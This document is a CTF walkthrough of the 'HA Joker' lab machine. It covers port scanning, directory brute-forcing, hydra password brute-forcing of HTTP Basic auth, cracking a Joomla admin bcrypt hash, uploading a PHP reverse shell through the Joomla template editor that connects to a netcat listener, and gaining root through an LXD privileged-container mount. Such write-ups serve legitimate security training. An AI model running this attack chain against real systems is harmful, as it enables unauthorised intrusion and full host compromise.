# HA Joker CTF

## Description

We (the creators) have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

1. Enumerate Services
    - Nmap
2. Bruteforce
    - Performing Bruteforce on files over http
    - Performing Bruteforce on Basic Authentication
3. Hash Crack
    - Performing Bruteforce on hash to crack zip file
    - Performing Bruteforce on hash to crack mysql user
4. Exploitation
    - Getting a reverse connection
    - Spawning a TTY Shell
5. Privilege Escalation
    - Get root taking advantage of flaws in LXD

# Initial Scan

We start with an Nmap scan and the result shows three open ports:

* 22 ssh
* 80 http
* 8080 http

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
~~~

We can see the Apache version and also we find out that port 8080 requiers authentication.

Apache version: `2.4.29`

Port with no authentication needed: `80`

# Webpage

## Enumeration

We don't have creds to connect to SSH service or login on port 8080. Let's head to port 80. We can't find anything interesting from the page itself, so let's run `gobuster` on it to find directories. I ran it with `-x` flag to find files with certain extentions which can be useful. ( I cleaned the result a bit.)

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP:80 -x zip,txt,php     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.1.109:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              zip,txt,php
[+] Timeout:                 10s
===============================================================
2021/10/12 07:15:40 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.1.109/css/]
/img                  (Status: 301) [Size: 310] [--> http://10.10.1.109/img/]
/index.html           (Status: 200) [Size: 5954]                              
/phpinfo.php          (Status: 200) [Size: 94771]                             
/phpinfo.php          (Status: 200) [Size: 94771]                             
/secret.txt           (Status: 200) [Size: 320]                               
~~~

Secret file: `secret.txt`

Backend info file: `phpinfo.php`

The directory brute-force shows a php file (which we really don't need it) and a txt file. After navigating to it, we can see a conversation between joker and batman:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
└─$ curl -s "http://$IP/secret.txt"
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
~~~

Username: `joker`

## Brute-forcing port 8080

As we can see, the word **"rock"** has been used a few times which is probably refering to the famous `rockyou` wordlist which you can download [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjalMrg5MTzAhUSzqQKHSc5C2UQFnoECAUQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd). We can try to brute-force the http page on port 8080 which requiers creds. I used `hydra` to brute-force the password for user `joker` using rockyou wordlist.

Port with authentication: `8080`

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 $IP http-get  
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-12 07:51:36
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.1.109:8080/
[8080][http-get] host: 10.10.1.109   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-12 07:52:04
~~~

Joker's password: `hannah`

## More Enumeration

Now that we have access to this port which is the page with CMS installed on it, in order to gain a shell, we have to get access to admin panel. The first thing I do is to check `/robots.txt` which can reveal us some important directories. This page includes the login page for admin panel.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
└─$ curl -s -H "Authorization: Basic am9rZXI6aGFubmFo" "http://$IP:8080/robots.txt"  
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/      <-------------------
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
~~~

Admin directory: `/administrator/`

We need to find the creds to login to admin panel. Let's run `gobuster` on admin login page to see if we can find anything else. (I used `-x` flag again to find files with certain extentions). You can use `-U` and `-P` to enter the creds for the authentication.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HA_Joker_CTF]
└─$ gobuster dir -U joker -P hannah -w /usr/share/dirb/wordlists/common.txt -u http://$IP:8080/ -x zip,txt,old
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.1.109:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               joker
[+] Extensions:              old,zip,txt
[+] Timeout:                 10s
===============================================================
2021/10/12 08:53:04 Starting gobuster in directory enumeration mode
===============================================================
/.hta.zip             (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.hta.old             (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd.zip        (Status: 403) [Size: 279]
/.htaccess.zip        (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htpasswd.old        (Status: 403) [Size: 279]
/.htaccess.old        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.1.109:8080/administrator/]
/backup
/backup.zip
/bin                  (Status: 301) [Size: 317] [--> http://10.10.1.109:8080/bin/]          
/cache                (Status: 301) [Size: 319] [--> http://10.10.1.109:8080/cache/]        
/components           (Status: 301) [Size: 324] [--> http://10.10.1.109:8080/components/]

[REDACTED]

~~~

Backup file: `backup.zip`

We found a backup file. I downloaded the zip file and when I tried to extract it, I was asked for a passphrase. Before I try to crack it, I tried `hannah` and it worked (Always test for password reuse!). If it didn't, we had to use `zip2john` and then crack it with `john`.

Zip file passphrase: `hannah`

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HA_Joker_CTF/files]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] db/joomladb.sql password:
~~~

Now that we have the backup files, we might be able to find the password for admin. I couldn't find the password for the admin but I found the password for the database.

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HA_Joker_CTF/files]
└─$ cat site/configuration.php | head -n20
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'joker';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla';      <--------------
	public $password = '1234';    <--------------
	public $db = 'joomladb';
	public $dbprefix = 'cc1gr_';
	public $live_site = '';
~~~

We can try to look through the database. I used `grep` command and found the users that have access to the database. I also found the password hash for the admin.

~~~
┌──(user㉿Y0B01)-[~/…/thm/HA_Joker_CTF/files/db]
└─$ cat joomladb.sql| grep cc1gr_users
-- Table structure for table `cc1gr_users`
DROP TABLE IF EXISTS `cc1gr_users`;
CREATE TABLE `cc1gr_users` (
-- Dumping data for table `cc1gr_users`
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
~~~

The “Super Duper User": `admin`

I saved the password hash and cracked it using `john` and `rockyou` wordlist.

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HA_Joker_CTF/files]
└─$ john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt            
Created directory: /home/user/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abcd1234         (?)
1g 0:00:00:11 DONE (2021-10-12 10:48) 0.08680g/s 90.62p/s 90.62c/s 90.62C/s bullshit..piolin
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~

Admin's password: `abcd1234`

# Reverse Shell

Now we can login to admin panel and upload a reverse shell. Navigate to `Configuration > Templates > Templates > Beez3 Details and Files` and choose `error.php` and replace it with a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the IP in the code to yours.

Now start a listener and save the code and the navigate to `http://$IP:8080/templates/beez3/error.php` to call the shell and now we have a shell. I spawnd a tty shell using a simple python code.

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HA_Joker_CTF/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.2.65] from (UNKNOWN) [10.10.1.109] 36474
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:59:06 up 27 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
$ whoami
www-data
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/$
~~~

User: `www-data`

Group: `lxd`

## Privilege Escalation

Now we need to gain root access. Since we are in lxd group, we can try to get access to root files. Let's list the images installed on the machine:

~~~
$ lxc image list
+----------+--------------+--------+------------------------------------+--------+--------+------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |            DESCRIPTION             |  ARCH  |  SIZE  |         UPLOAD DATE          |
+----------+--------------+--------+------------------------------------+--------+--------+------------------------------+

~~~

There is no images installed. There is supposed to be `myalpine`. We can install it ourselves. Do the following steps on your machine:
~~~
$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ ./build-alpine
~~~

The output is a `.tar.gz` file. transfer this file to the target machine with a python server and `wget` on the target machine. Now perfrom the following:

~~~
www-data@ubuntu:/tmp$ lxc image import alpine-v3.14-x86_64-20211012_1129.tar.gz --alias myalpine
<-v3.14-x86_64-20211012_1129.tar.gz --alias myalpine
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myalpine | d62494cf2606 | no     | alpine v3.14 (20211012_11:29) | x86_64 | 3.08MB | Oct 12, 2021 at 4:01pm (UTC) |
+----------+--------------+--------+-------------------------------+--------+--------+------------------------------+
www-data@ubuntu:/tmp$ lxc init myalpine joker -c security.privileged=true
lxc init myalpine joker -c security.privileged=true
Creating joker
www-data@ubuntu:/tmp$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to joker
www-data@ubuntu:/tmp$ lxc start joker
lxc start joker
www-data@ubuntu:/tmp$ lxc exec joker /bin/sh
lxc exec joker /bin/sh

~ # id
uid=0(root) gid=0(root)
~~~

Now we go to `/mnt/root/root` and can see the name of the file:

~~~
/mnt/root/root # ls
final.txt

/mnt/root/root # cat final.txt


     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!		
							
Contact us here:						
								
Hacking Articles : https://twitter.com/rajchandel/		
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
								
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
~~~

File in /root: `final.txt`

# D0N3!  ; )

Thanks to the creators of this room!

Hope you had fun hacking and have a good one!  : )
